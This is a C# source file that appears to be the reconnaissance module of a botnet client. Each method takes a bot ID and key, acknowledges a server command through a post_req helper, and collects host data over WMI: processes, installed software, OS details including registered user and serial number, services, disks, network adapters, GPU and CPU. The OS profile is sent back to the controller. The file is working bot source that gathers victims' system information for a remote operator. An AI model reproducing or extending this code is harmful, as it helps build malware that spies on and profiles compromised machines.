using System;
using System.Collections.Generic;
using System.Management;

namespace ConsoleApp3
{
    internal class cmd_GetInfo
    {
        public void GetInfo_Proccess(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_proccess = new HashSet<string>();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "Select Name, CommandLine From Win32_Process");

            foreach (ManagementObject instance in searcher.Get())
            {
                info_proccess.Add(Convert.ToString(instance["Name"]));
            }

            foreach (string i in info_proccess)
            {
                Console.WriteLine(i);
            }
        }

        public void GetInfo_Installed(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_installed = new HashSet<string>();
            ManagementObjectSearcher searcher_soft = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Product");

            foreach (ManagementObject queryObj in searcher_soft.Get())
            {
                info_installed.Add("Caption: " + Convert.ToString(queryObj["Caption"]));
                info_installed.Add("InstallDate: " + Convert.ToString(queryObj["InstallDate"]));
            }

            foreach (string i in info_installed)
            {
                Console.WriteLine(i);
            }
        }

        public void GetInfo_PC(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_pc = new HashSet<string>();
            ManagementObjectSearcher searcher5 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");

            foreach (ManagementObject queryObj in searcher5.Get())
            {
                info_pc.Add("BuildNumber: " + Convert.ToString(queryObj["BuildNumber"]));
                info_pc.Add("Caption: " + Convert.ToString(queryObj["Caption"]));
                info_pc.Add("FreePhysicalMemory: " + Convert.ToString(queryObj["FreePhysicalMemory"]));
                info_pc.Add("FreeVirtualMemory: " + Convert.ToString(queryObj["FreeVirtualMemory"]));
                info_pc.Add("Name: " + Convert.ToString(queryObj["Name"]));
                info_pc.Add("OSType: " + Convert.ToString(queryObj["OSType"]));
                info_pc.Add("RegisteredUser: " + Convert.ToString(queryObj["RegisteredUser"]));
                info_pc.Add("SerialNumber: " + Convert.ToString(queryObj["SerialNumber"]));
                info_pc.Add("ServicePackMajorVersion: " + Convert.ToString(queryObj["ServicePackMajorVersion"]));
                info_pc.Add("ServicePackMinorVersion: " + Convert.ToString(queryObj["ServicePackMinorVersion"]));
                info_pc.Add("Status: " + Convert.ToString(queryObj["Status"]));
                info_pc.Add("SystemDevice: " + Convert.ToString(queryObj["SystemDevice"]));
                info_pc.Add("SystemDirectory: " + Convert.ToString(queryObj["SystemDirectory"]));
                info_pc.Add("SystemDrive: " + Convert.ToString(queryObj["SystemDrive"]));
                info_pc.Add("Version: " + Convert.ToString(queryObj["Version"]));
                info_pc.Add("WindowsDirectory: " + Convert.ToString(queryObj["WindowsDirectory"]));
            }

            string info_pc_string = "";

            foreach (string i in info_pc)
            {
                info_pc_string += i + "\n";
            }

            post_req.addOtherData(key, bot_id, "info", info_pc_string);
        }

        public void GetInfo_Services(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_services = new HashSet<string>();
            ManagementObjectSearcher searcher3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Service");

            foreach (ManagementObject queryObj in searcher3.Get())
            {
                info_services.Add("Capacity: " + Convert.ToString(queryObj["Caption"]));
                info_services.Add("Caption: " + Convert.ToString(queryObj["Description"]));
                info_services.Add("DriveLetter: " + Convert.ToString(queryObj["DisplayName"]));
                info_services.Add("DriveType: " + Convert.ToString(queryObj["Name"]));
                info_services.Add("FileSystem: " + Convert.ToString(queryObj["PathName"]));
                info_services.Add("FreeSpace: " + Convert.ToString(queryObj["Started"]));
            }

            foreach (string i in info_services)
            {
                Console.WriteLine(i);
            }
        }

        public void GetInfo_Disks(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_disks = new HashSet<string>();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2","SELECT * FROM Win32_Volume");
            foreach (ManagementObject queryObj in searcher.Get())
            {
                info_disks.Add("Capacity: " + queryObj["Capacity"]);
                info_disks.Add("Caption: " + queryObj["Caption"]);
                info_disks.Add("DriveLetter: " + queryObj["DriveLetter"]);
                info_disks.Add("DriveType: " + queryObj["DriveType"]);
                info_disks.Add("FileSystem: " + queryObj["FileSystem"]);
                info_disks.Add("FreeSpace: " + queryObj["FreeSpace"]);
            }
            foreach (string i in info_disks)
            {
                Console.WriteLine(i);
            }
        }

        public void GetInfo_Interfaces(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_interfaces = new HashSet<string>();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_NetworkAdapterConfiguration");

            foreach (ManagementObject queryObj in searcher.Get())
            {
                Convert.ToString(info_interfaces.Add("Caption: " + queryObj["Caption"]));

                if (queryObj["DefaultIPGateway"] == null)
                    Convert.ToString(info_interfaces.Add("DefaultIPGateway: " + queryObj["DefaultIPGateway"]));
                else
                {
                    String[] arrDefaultIPGateway = (String[])(queryObj["DefaultIPGateway"]);
                    foreach (String arrValue in arrDefaultIPGateway)
                    {
                        Convert.ToString(info_interfaces.Add("DefaultIPGateway: " + arrValue));
                    }
                }

                if (queryObj["DNSServerSearchOrder"] == null)
                    Convert.ToString(info_interfaces.Add("DNSServerSearchOrder: " + queryObj["DNSServerSearchOrder"]));
                else
                {
                    String[] arrDNSServerSearchOrder = (String[])(queryObj["DNSServerSearchOrder"]);
                    foreach (String arrValue in arrDNSServerSearchOrder)
                    {
                        Convert.ToString(info_interfaces.Add("DNSServerSearchOrder: " + arrValue));
                    }
                }

                if (queryObj["IPAddress"] == null)
                    Convert.ToString(info_interfaces.Add("IPAddress: " + queryObj["IPAddress"]));
                else
                {
                    String[] arrIPAddress = (String[])(queryObj["IPAddress"]);
                    foreach (String arrValue in arrIPAddress)
                    {
                        Convert.ToString(info_interfaces.Add("IPAddress: " + arrValue));
                    }
                }

                if (queryObj["IPSubnet"] == null)
                    Convert.ToString(info_interfaces.Add("IPSubnet: " + queryObj["IPSubnet"]));
                else
                {
                    String[] arrIPSubnet = (String[])(queryObj["IPSubnet"]);
                    foreach (String arrValue in arrIPSubnet)
                    {
                        Convert.ToString(info_interfaces.Add("IPSubnet: " + arrValue));
                    }
                }
                Convert.ToString(info_interfaces.Add("MACAddress: " + queryObj["MACAddress"]));
                Convert.ToString(info_interfaces.Add("ServiceName: " + queryObj["ServiceName"]));
            }

            foreach (string i in info_interfaces)
            {
                Console.WriteLine(i);
            }
        }

        public void GetInfo_GPU (string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_GPU = new HashSet<string>();
            ManagementObjectSearcher searcher11 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");

            foreach (ManagementObject queryObj in searcher11.Get())
            {
                info_GPU.Add("AdapterRAM: " + queryObj["AdapterRAM"]);
                info_GPU.Add("Caption: " + queryObj["Caption"]);
                info_GPU.Add("Description: " + queryObj["Description"]);
                info_GPU.Add("VideoProcessor: " + queryObj["VideoProcessor"]);
            }

            foreach (string i in info_GPU)
            {
                Console.WriteLine(i);
            }
        }

        public void GetInfo_CPU(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            HashSet<string> info_CPU = new HashSet<string>();
            ManagementObjectSearcher searcher8 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");

            foreach (ManagementObject queryObj in searcher8.Get())
            {
                info_CPU.Add("Name: " + queryObj["Name"]);
                info_CPU.Add("NumberOfCores: " + queryObj["NumberOfCores"]);
                info_CPU.Add("ProcessorId: " + queryObj["ProcessorId"]);
            }

            foreach (string i in info_CPU)
            {
                Console.WriteLine(i);
            }
        }
   }
}
